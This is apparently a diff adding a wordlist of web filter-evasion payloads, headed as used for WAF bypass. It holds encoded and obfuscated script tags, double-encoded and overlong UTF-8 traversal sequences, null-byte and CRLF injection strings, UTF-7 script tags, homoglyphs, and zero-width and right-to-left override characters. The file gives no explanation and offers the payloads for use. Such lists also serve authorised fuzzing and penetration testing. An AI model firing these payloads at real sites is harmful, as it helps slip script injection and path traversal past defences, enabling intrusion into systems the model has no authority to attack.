@@ -1,0 +1,82 @@
+# Unicode and Encoding Bypass Payloads
+# Used for WAF bypass and filter evasion
+
+# URL encoding variations
+%3Cscript%3E
+%3c%73%63%72%69%70%74%3e
+%253Cscript%253E
+%25%33%43script%25%33%45
+
+# Double encoding
+%252f
+%252e%252e
+%2525%2532%2565
+
+# Unicode normalization attacks
+＜script＞
+﹤script﹥
+<ｓｃｒｉｐｔ>
+<ＳＣＲＩＰＴ>
+
+# Overlong UTF-8
+%c0%af
+%e0%80%af
+%f0%80%80%af
+
+# Unicode homoglyphs
+ѕсrірt
+аdmin
+раssword
+lοgin
+
+# Mixed encoding
+<scr%69pt>
+<sc%00ript>
+<scri%00pt>
+
+# UTF-7 encoding (for older systems)
++ADw-script+AD4-
++ADw-/script+AD4-
+
+# HTML entity encoding
+&#60;script&#62;
+&#x3c;script&#x3e;
+&lt;script&gt;
+
+# Null byte injection
+%00
+\x00
+\u0000
+&#0;
+
+# CRLF injection
+%0d%0a
+%0d
+%0a
+\r\n
+
+# Unicode BOM
+%ef%bb%bf
+\ufeff
+
+# Right-to-left override
+%e2%80%ae
+\u202e
+
+# Combining characters
+a%cc%88  # ä via combining
+e%cc%81  # é via combining
+
+# Zero-width characters
+%e2%80%8b  # zero-width space
+%e2%80%8c  # zero-width non-joiner
+%e2%80%8d  # zero-width joiner
+
+# Fullwidth characters
+ａｄｍｉｎ
+ｐａｓｓｗｏｒｄ
+ｌｏｇｉｎ
+
+# Superscript/subscript
+admin⁰¹²³
+test₀₁₂₃
